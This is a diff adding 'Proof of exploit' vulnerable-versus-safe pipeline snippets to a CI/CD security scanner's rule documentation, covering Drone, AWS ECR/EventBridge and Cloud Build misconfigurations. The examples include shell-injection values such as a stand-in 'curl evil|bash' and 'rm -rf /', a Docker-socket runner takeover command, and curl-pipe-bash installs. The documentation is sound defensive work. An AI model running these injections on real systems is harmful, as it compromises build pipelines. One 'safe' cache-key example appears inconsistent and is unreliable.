+type: docker
+name: deploy
+steps:
+  - name: upload
+    image: aws-cli@sha256:abc123...
+    environment:
+      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+      AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+    commands:
+      - aws s3 cp build/ s3://bucket/
+
+# Safe: reference Drone secrets via ``from_secret``. The
+# actual values live in Drone's secret store (per-repo or
+# org-level), are masked in logs, and can rotate without
+# a pipeline-file change.
+kind: pipeline
+type: docker
+name: deploy
+steps:
+  - name: upload
+    image: aws-cli@sha256:abc123...
+    environment:
+      AWS_ACCESS_KEY_ID:
+        from_secret: aws_access_key_id
+      AWS_SECRET_ACCESS_KEY:
+        from_secret: aws_secret_access_key
+    commands:
+      - aws s3 cp build/ s3://bucket/
+```
 
 **Source:** [`DR-004`](../providers/drone.md#dr-004) in the [Drone CI provider](../providers/drone.md).
 
@@ -4080,6 +6703,38 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 
 - Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``plugins/docker:latest`` resolves at runner
+# start to whatever Docker Hub currently serves under the
+# ``latest`` tag. Whoever controls the plugin repo (or
+# anyone with publisher access) ships code into every
+# pipeline that uses the plugin.
+kind: pipeline
+type: docker
+name: publish
+steps:
+  - name: push-image
+    image: plugins/docker:latest
+    settings:
+      repo: myorg/app
+      tags: latest
+
+# Safe: pin the plugin image to a content-addressable
+# digest. The plugin can't be repointed without changing
+# the pipeline file (and a reviewable PR with it).
+kind: pipeline
+type: docker
+name: publish
+steps:
+  - name: push-image
+    image: plugins/docker@sha256:abc123...
+    settings:
+      repo: myorg/app
+      tags: ${DRONE_TAG}
+```
+
 **Source:** [`DR-005`](../providers/drone.md#dr-005) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-006`: TLS verification disabled in step commands <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-006 }
@@ -4089,6 +6744,41 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 **How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector shared with GHA-027, BK-008, JF-022, ADO-026, CC-024, GCB-011, and the CFN / Terraform rule packs. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. The rule scans every ``commands:`` entry on every step.
 
 **Recommendation.** Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every npm install in the build skips strict-
+# ssl validation. An attacker on the network path (corp
+# proxy, malicious mirror, BGP hijack) MITMs the registry
+# and ships malicious tarballs that npm installs without
+# any signal.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: install
+    image: node:20@sha256:abc123...
+    commands:
+      - npm config set strict-ssl false
+      - npm install
+
+# Safe: install the missing CA into the image (or use the
+# default trust store). Never disable TLS verification
+# pipeline-wide; if a registry's cert is broken, fix the
+# registry rather than papering over with a bypass that
+# outlives the broken cert.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: install
+    image: node:20@sha256:abc123...
+    commands:
+      - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+      - update-ca-certificates
+      - npm install
+```
 
 **Source:** [`DR-006`](../providers/drone.md#dr-006) in the [Drone CI provider](../providers/drone.md).
 
@@ -4111,6 +6801,42 @@ The rule fires on the volume *declaration*, not on step-level mounts. A pipeline
 **Known false positives.**
 
 - Trusted-only pipelines on a dedicated runner fleet (no fork-PR access, no untrusted contributors) sometimes deliberately mount the Docker socket for image build / push workflows. Suppress via ignore-file when this is the deliberate posture and the runner pool's isolation is documented elsewhere; the rule has no way to know whether ``trusted: true`` is set on the repo from the pipeline YAML alone.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: mounting ``/var/run/docker.sock`` into the
+# step gives the step's container the Docker API as root
+# on the runner. ``docker run --privileged -v /:/host``
+# from inside the step then owns the runner.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: docker:24
+    volumes:
+      - name: dockersock
+        path: /var/run/docker.sock
+    commands:
+      - docker build -t app .
+volumes:
+  - name: dockersock
+    host:
+      path: /var/run/docker.sock
+
+# Safe: use a rootless image builder (Kaniko / BuildKit
+# rootless) that doesn't need the host runtime socket.
+# An empty temp volume is enough for the build cache.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: gcr.io/kaniko-project/executor@sha256:abc123...
+    commands:
+      - /kaniko/executor --context=. --destination=registry/app:tag
+```
 
 **Source:** [`DR-007`](../providers/drone.md#dr-007) in the [Drone CI provider](../providers/drone.md).
 
@@ -4139,6 +6865,54 @@ The rule fires on the volume *declaration*, not on step-level mounts. A pipeline
 **Known false positives.**
 
 - Plugins that namespace cache reads by branch on the *write* side and never read across branches (a deliberate cache partitioning) are technically safe, the attacker can poison their own branch's cache but can't reach the trusted-branch one. The rule has no way to verify partition boundaries at scan time; suppress via ignore-file scoped to the specific step name when the partitioning is audited.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``cache_key`` interpolates ``${DRONE_BRANCH}``.
+# A fork PR opens a branch named ``main`` (legal on the
+# fork side) and runs its build, populating the cache
+# under key ``main-build``. The next trusted-context
+# build of the *real* main branch reads the SAME cache
+# key — and pulls the fork PR's poisoned artifacts into
+# the production build.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: restore-cache
+    image: meltwater/drone-cache@sha256:abc123...
+    settings:
+      restore: true
+      cache_key: ${DRONE_BRANCH}-build
+      mount: [vendor/]
+  - name: build
+    image: golang@sha256:abc123...
+    commands: [go build ./...]
+
+# Safe: key on commit-stable inputs only — a SHA256 of
+# the lockfile (or ``go.sum`` / ``Cargo.lock`` / etc.)
+# is unique enough and is not attacker-controllable
+# across PR boundaries. ``${DRONE_COMMIT_SHA}`` is also
+# safe (cryptographic, fork-PR-distinct).
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: hash-deps
+    image: alpine@sha256:abc123...
+    commands:
+      - sha256sum go.sum | cut -d' ' -f1 > /tmp/dephash
+  - name: restore-cache
+    image: meltwater/drone-cache@sha256:abc123...
+    settings:
+      restore: true
+      cache_key: deps-${SHA}
+      mount: [vendor/]
+    environment:
+      SHA:
+        from_secret: deps_sha
+```
 
 **Source:** [`DR-009`](../providers/drone.md#dr-009) in the [Drone CI provider](../providers/drone.md).
 
@@ -4172,6 +6946,43 @@ Detection is value-only and case-sensitive against the documented variable names
 
 - Some teams use a static prefix plus a CI-controlled tail (``node: { pool: build-${DRONE_REPO_NAME} }``) to share a runner pool across repos. ``DRONE_REPO_NAME`` is set by the server, not the pusher, so it isn't on the tainted list, but if your team has its own conventions for trusted Drone vars, suppress on the specific pipeline name.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``node.queue: ${DRONE_BRANCH}`` lets a PR
+# author route their build to any runner pool by naming
+# their branch after it. A branch named ``production``
+# routes the PR build to the production-only runner with
+# elevated permissions, which were never meant to be
+# reachable from a PR.
+kind: pipeline
+type: docker
+name: build
+node:
+  queue: ${DRONE_BRANCH}
+steps:
+  - name: deploy
+    image: deploy-cli@sha256:abc123...
+    commands:
+      - ./deploy.sh
+
+# Safe: pin the runner label to a static literal that
+# matches your targeting policy. Production runners
+# should ALSO enforce the label server-side (Drone
+# agent's ``--labels`` flag) so the rule is one layer
+# of defense-in-depth.
+kind: pipeline
+type: docker
+name: build
+node:
+  queue: production
+steps:
+  - name: deploy
+    image: deploy-cli@sha256:abc123...
+    commands:
+      - ./deploy.sh
+```
+
 **Source:** [`DR-011`](../providers/drone.md#dr-011) in the [Drone CI provider](../providers/drone.md).
 
 ### `EB-000`: EventBridge API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-eb-000 }
@@ -4202,6 +7013,38 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Replace wildcard target ARNs with specific resource ARNs. EventBridge targets with ``*`` route events to any resource that matches the prefix, frequently triggering unintended Lambda invocations or SNS sends.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an EventBridge rule with a wildcard ARN
+# target. The rule fires events at
+# ``arn:aws:lambda:us-east-1:123456789012:function:*``
+# — every Lambda in the account. A buggy event source
+# (or a deliberately crafted EventBridge event) can
+# now trigger arbitrary functions with whatever
+# payload the event carries.
+import boto3
+eb = boto3.client('events')
+eb.put_targets(
+    Rule='on-codebuild-failure',
+    Targets=[{
+        'Id': '1',
+        'Arn': 'arn:aws:lambda:us-east-1:123456789012:function:*',
+    }]
+)
+
+# Safe: target a specific Lambda by full ARN. The
+# event reaches exactly the function it was meant for;
+# unrelated functions stay unbothered.
+eb.put_targets(
+    Rule='on-codebuild-failure',
+    Targets=[{
+        'Id': '1',
+        'Arn': 'arn:aws:lambda:us-east-1:123456789012:function:notify-oncall',
+    }]
+)
+```
+
 **Source:** [`EB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-000`: ECR API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ecr-000 }
@@ -4222,6 +7065,34 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageScanningConfiguration.
+# scanOnPush: false``. Every pushed image lands without
+# a vulnerability scan; the registry's downstream consumers
+# pull whatever CVE-laden base layer the build produced.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageScanningConfiguration={'scanOnPush': False},
+)
+
+# Safe: enable scan-on-push. Pair with Inspector v2
+# enhanced scanning (ECR-007) for continuous re-scans
+# against the latest CVE database. Block deploys on
+# scan failures via an Inspector finding -> EventBridge
+# -> CodePipeline gate.
+ecr.put_image_scanning_configuration(
+    repositoryName='myapp',
+    imageScanningConfiguration={'scanOnPush': True},
+)
+# Enable enhanced scanning org-wide:
+inspector = boto3.client('inspector2')
+inspector.enable(resourceTypes=['ECR'])
+```
+
 **Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }
@@ -4232,6 +7103,31 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repo with ``imageTagMutability:
+# MUTABLE``. Anyone with ``ecr:PutImage`` (build role,
+# CI/CD credential, leaked token) can push a different
+# image under the same tag, silently swapping what
+# downstream consumers pull next.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_repository(
+    repositoryName='myapp',
+    imageTagMutability='MUTABLE',
+)
+
+# Safe: ``IMMUTABLE``. Tags can only be pushed once;
+# re-pushing the same tag fails. Updates ship as a new
+# version tag (and the digest never collides), forcing
+# downstream consumers to explicitly bump.
+ecr.put_image_tag_mutability(
+    repositoryName='myapp',
+    imageTagMutability='IMMUTABLE',
+)
+```
+
 **Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-003`: Repository policy allows public access <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ecr-003 }
@@ -4241,6 +7137,39 @@ Detection is value-only and case-sensitive against the documented variable names
 **How this is detected.** A wildcard-principal repo policy means anyone on the internet can pull images. Sometimes intentional (a publicly-distributed base image), but should be a deliberate exposure, typically via the ECR Public registry rather than a private repo with a public policy. The default for build-output images should never be public.
 
 **Recommendation.** Remove wildcard principals from the repository policy. Grant access only to specific AWS account IDs or IAM principals that require it.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ECR repository policy with
+# ``Principal: '*'``. Anyone on the internet can pull
+# images from the repo (and discover internal app
+# names + base-image versions). For repos that store
+# private internal images, this is a direct supply-
+# chain disclosure.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": "*",
+    "Action": ["ecr:BatchGetImage", "ecr:GetDownloadUrlForLayer"]
+  }]
+}
+
+# Safe: scope to the account / org. If the image really
+# is meant to be public, use ECR Public (a separate
+# service for community-distributed images) rather than
+# a wildcard policy on a private registry.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "*"},
+    "Action": ["ecr:BatchGetImage", "ecr:GetDownloadUrlForLayer"],
+    "Condition": {"StringEquals": {"aws:PrincipalOrgID": "o-abc123def4"}}
+  }]
+}
+```
 
 **Source:** [`ECR-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -4272,6 +7201,35 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an ECR pull-through cache rule with an
+# untrusted upstream registry. Untrusted = anything
+# other than AWS / k8s.io / Docker Hub Verified
+# Publishers. A pull-through cache means ECR fetches
+# from the upstream on first reference and caches the
+# bytes; if the upstream is compromised, those bytes
+# land in your registry and ship to every consumer.
+import boto3
+ecr = boto3.client('ecr')
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='internal-mirror',
+    upstreamRegistryUrl='https://rando-mirror.example.com',
+)
+
+# Safe: pull-through caches only against well-known
+# upstreams whose publisher controls you trust
+# (Docker Hub Verified, ECR Public, Quay, K8s.io). For
+# anything else, replicate via an org-controlled mirror
+# with content scanning between the upstream and your
+# registry.
+ecr.create_pull_through_cache_rule(
+    ecrRepositoryPrefix='public-cache',
+    upstreamRegistryUrl='https://public.ecr.aws',
+)
+```
+
 **Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `ECR-007`: Inspector v2 enhanced scanning disabled for ECR <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-007 }
@@ -4294,6 +7252,25 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``gcr.io/cloud-builders/gcloud`` resolves to
+# the registry's latest at build time. Google's update of
+# the underlying image is silently picked up; a namespace
+# / publisher takeover would ship malicious code into
+# every Cloud Build that uses the step.
+steps:
+  - name: gcr.io/cloud-builders/gcloud
+    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot bump the digest in reviewable PRs.
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
+```
+
 **Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-002`: Cloud Build uses the default service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-002 }
@@ -4303,6 +7280,30 @@ Detection is value-only and case-sensitive against the documented variable names
 **How this is detected.** The default Cloud Build service account historically held ``roles/cloudbuild.builds.builder`` plus project-level editor in many organisations. Even under the GCP April-2024 default-identity change, the default SA is still broader than what a single pipeline needs. Explicit ``serviceAccount:`` is required to pass.
 
 **Recommendation.** Create a dedicated service account for the build, grant it only the roles the pipeline actually needs (``roles/artifactregistry.writer``, ``roles/storage.objectCreator`` for artifact upload, etc.), and set ``serviceAccount: projects/<PROJECT>/serviceAccounts/<NAME>@...``. Leaving it unset falls back to the default Cloud Build SA, which accumulates roles over a project's lifetime and is routinely granted ``roles/editor``.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: no ``serviceAccount:`` declared. Cloud Build
+# falls back to the legacy default
+# ``<proj-num>@cloudbuild.gserviceaccount.com``, which on
+# older projects carries Project Editor or has manually-
+# granted Storage Admin / Run Admin / etc. Any build (even
+# from a fork PR trigger) executes with that authority.
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+# no serviceAccount: line — uses the legacy default SA
+
+# Safe: declare a custom service account scoped to the
+# minimum roles this pipeline needs (Cloud Run Deployer
+# on a single service, Artifact Registry Reader on the
+# specific repo). Each pipeline gets its own SA.
+serviceAccount: projects/myproj/serviceAccounts/cd-pipeline@myproj.iam.gserviceaccount.com
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+```
 
 **Source:** [`GCB-002`](../providers/cloudbuild.md#gcb-002) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4318,6 +7319,41 @@ Detection is value-only and case-sensitive against the documented variable names
 
 - Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``args`` carries a Secret Manager reference.
+# Cloud Build resolves it at substitution time and the
+# expanded value lands in the build's args[], which the
+# Cloud Build log records verbatim. Any IAM principal
+# with ``cloudbuild.builds.get`` reads the value.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [--header, "Authorization: Bearer $$API_TOKEN", https://api.example.com/deploy]
+    secretEnv: [API_TOKEN]
+availableSecrets:
+  secretManager:
+    - versionName: projects/myproj/secrets/api-token/versions/latest
+      env: API_TOKEN
+
+# Safe: keep the secret in ``secretEnv`` only, never in
+# ``args``. The step body references the env var by name
+# (``$$API_TOKEN`` is a Cloud Build escape that becomes
+# ``$API_TOKEN`` at shell-runtime), so the build log
+# records the env name rather than the value.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - curl --header "Authorization: Bearer $$API_TOKEN" https://api.example.com/deploy
+    secretEnv: [API_TOKEN]
+availableSecrets:
+  secretManager:
+    - versionName: projects/myproj/secrets/api-token/versions/1
+      env: API_TOKEN
+```
+
 **Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }
@@ -4331,6 +7367,38 @@ Detection is value-only and case-sensitive against the documented variable names
 **Known false positives.**
 
 - Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``dynamicSubstitutions: true`` expands
+# ``${USER_INPUT}`` at args-evaluation time. A trigger
+# substitution carrying ``v1.0";curl evil|bash;"`` lands
+# the metacharacters in the args array — the step's shell
+# parses them as separate commands.
+substitutions:
+  _TAG: v1.0
+options:
+  dynamicSubstitutions: true
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    args: [build, -t, "image:${_TAG}", .]
+
+# Safe: either disable dynamicSubstitutions (use literal
+# substitutions instead) or pass the substitution through
+# an env var and let the shell handle quoting. The
+# substitution becomes a single string argument the
+# attacker can't escape from.
+substitutions:
+  _TAG: v1.0
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    entrypoint: bash
+    env: [TAG=${_TAG}]
+    args:
+      - -c
+      - docker build -t "image:$TAG" .
+```
 
 **Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4357,6 +7425,33 @@ Detection is value-only and case-sensitive against the documented variable names
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a value that came from a
+# substitution (or anywhere outside the step body) gives
+# the value full shell-grammar reach. ``sh -c`` on an
+# unquoted variable is the same shape.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - eval "$BUILD_CMD"
+    env: [BUILD_CMD=${_USER_CMD}]
+
+# Safe: never eval untrusted input. Replace the dynamic
+# command with an explicit dispatcher over an allow-list
+# of safe actions, or invoke a script you own that does
+# its own input validation.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - ./scripts/dispatch.sh "${_USER_CMD}"
+```
 
 **Source:** [`GCB-006`](../providers/cloudbuild.md#gcb-006) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4400,6 +7495,34 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository and invoke it from the checkout, removing the network fetch removes the attacker-controllable content entirely.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` lets an attacker who
+# controls DNS / the installer host substitute the script
+# at install time. The injected code runs in the step's
+# shell with the build's full credential set.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - |
+        set -e
+        curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+        echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+        bash /tmp/cli.sh
+```
+
 **Source:** [`GCB-010`](../providers/cloudbuild.md#gcb-010) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-011`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-011 }
@@ -4412,6 +7535,25 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl -k`` disables certificate verification
+# for the duration of the call. An attacker on the network
+# path (compromised proxy, malicious VPN exit) MITMs the
+# response and ships substituted bytes into the build.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [-k, -O, https://internal-mirror.example.com/artifact.tar.gz]
+
+# Safe: keep TLS verification on. If the internal mirror
+# uses a private CA, install the CA into the step image's
+# trust store rather than papering over with ``-k``.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [-O, https://internal-mirror.example.com/artifact.tar.gz]
+```
+
 **Source:** [`GCB-011`](../providers/cloudbuild.md#gcb-011) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-012`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gcb-012 }
@@ -4421,6 +7563,37 @@ Detection is value-only and case-sensitive against the documented variable names
 **How this is detected.** Complements GCB-003 (inline ``gcloud secrets versions access``) and GCB-007 (``/versions/latest`` alias). This rule runs the shared credential-shape catalog against every string in the YAML. AWS keys, GitHub PATs, Slack webhooks, JWTs, PEM private key blocks, and any user-registered ``--secret-pattern`` regex. Known placeholders like ``EXAMPLE``/``CHANGEME`` are already filtered upstream so fixtures and docs don't false-match.
 
 **Recommendation.** Rotate the exposed credential immediately. Move the value to ``availableSecrets.secretManager`` and reference it via ``secretEnv:`` so the plaintext never lands in the YAML or the build logs. For cloud access prefer workload-identity federation over long-lived keys.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in
+# ``substitutions:``. The Cloud Build YAML is committed
+# to git and the build log echoes the value whenever the
+# step prints its environment.
+substitutions:
+  _AWS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  _AWS_SECRET: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+steps:
+  - name: amazon/aws-cli@sha256:abc123...
+    env: [AWS_ACCESS_KEY_ID=${_AWS_KEY_ID}, AWS_SECRET_ACCESS_KEY=${_AWS_SECRET}]
+    args: [s3, cp, ./build, s3://bucket/]
+
+# Safe: fetch from Secret Manager via ``availableSecrets``.
+# The build references the secret by version name; the
+# value never lands in the build YAML or in plaintext
+# logs (Cloud Build masks ``secretEnv`` values).
+steps:
+  - name: amazon/aws-cli@sha256:abc123...
+    secretEnv: [AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY]
+    args: [s3, cp, ./build, s3://bucket/]
+availableSecrets:
+  secretManager:
+    - versionName: projects/p/secrets/aws-key-id/versions/1
+      env: AWS_ACCESS_KEY_ID
+    - versionName: projects/p/secrets/aws-secret/versions/1
+      env: AWS_SECRET_ACCESS_KEY
+```
 
 **Source:** [`GCB-012`](../providers/cloudbuild.md#gcb-012) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4443,6 +7616,30 @@ Detection is value-only and case-sensitive against the documented variable names
 **Recommendation.** Remove the ``logging: NONE`` override, or replace it with ``CLOUD_LOGGING_ONLY`` / ``GCS_ONLY``, so every step's stdout, stderr, and exit code is persisted. Loss of logs is a detection-and-response black hole; the storage cost is measured in cents.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``logging: NONE`` disables build log capture
+# entirely. Failures, attacker activity, secret leaks —
+# nothing is recorded. Forensics on a compromise is
+# impossible because the build has no log trail.
+options:
+  logging: NONE
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    args: [build, -t, app, .]
+
+# Safe: leave logging at the default (``CLOUD_LOGGING_ONLY``)
+# or explicitly send to a hardened Cloud Storage bucket
+# with retention + IAM tied down. Logs are the audit trail
+# for every other security control.
+options:
+  logging: CLOUD_LOGGING_ONLY
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    args: [build, -t, app, .]
+```
 
 **Source:** [`GCB-014`](../providers/cloudbuild.md#gcb-014) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4502,6 +7699,34 @@ Detection is value-only and case-sensitive against the documented variable names
 
 - Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``entrypoint: bash`` plus a user substitution
+# inside ``args:`` means the substitution's content is
+# parsed by bash. A trigger substitution carrying shell
+# metacharacters (``v1.0";rm -rf /;"``) executes as
+# separate commands.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - echo "building ${_TAG}" && ./build.sh --tag ${_TAG}
+
+# Safe: pass the substitution through an env var so the
+# shell sees one argument. Quote on every use. The shell
+# treats injected metacharacters as literal characters
+# in the env value.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    env: [TAG=${_TAG}]
+    args:
+      - -c
+      - echo "building $TAG" && ./build.sh --tag "$TAG"
+```
+
 **Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-020`: serviceAccount points at the default Cloud Build service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-020 }
@@ -4515,6 +7740,29 @@ Detection is value-only and case-sensitive against the documented variable names
 **Known false positives.**
 
 - Single-pipeline GCP projects where the default SA's roles are actively scoped down. Rare in practice; create a named SA anyway so the audit log stays unambiguous about which pipeline made each API call.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``serviceAccount:`` is set but points at the
+# legacy default Cloud Build SA. The default carries
+# Project Editor (older projects) or whatever roles got
+# attached over time; sharing it across pipelines collapses
+# the blast radius of any one compromise to every pipeline.
+serviceAccount: projects/myproj/serviceAccounts/123456789@cloudbuild.gserviceaccount.com
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+
+# Safe: create a per-pipeline service account with only
+# the roles this pipeline needs. The default SA stays out
+# of any builds you author; if it lingers on a legacy
+# trigger you don't control, audit and migrate.
